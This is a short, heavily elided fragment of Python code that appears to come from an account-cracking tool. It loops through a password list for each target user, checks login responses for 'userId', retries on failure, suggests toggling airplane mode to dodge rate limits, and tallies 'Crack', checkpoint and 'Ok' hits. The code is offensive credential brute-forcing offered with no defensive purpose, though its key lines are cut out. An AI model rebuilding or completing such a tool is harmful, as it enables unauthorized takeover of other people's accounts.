            ...
            for pw in pwx:
                ...
                with requests.Session() as ses:
                    ...
                    if 'userId' in str(response):
                        ...
                        print(f"{P}[{M}!{P}]{M} Use Airplane Mode 2 Seconds", end='\r');sleep(0);__main__(self, user, uid, pwx)
                    else:
                        continue
            self.kill +=1
            print(f"{A}╚═➣ [{H}Crack{A}]{H} {self.kill}/{str(len(user))} {J}Cp:-{len(self.cp)} {H}Ok:-{len(self.ok)}          ", end='\r')
        except (ConnectionError):
            print(f"{A}╚═➣ [{M}!{A}]{J} connection Error               ", end='\r');sleep(0);__main__(self, user, uid, pwx)
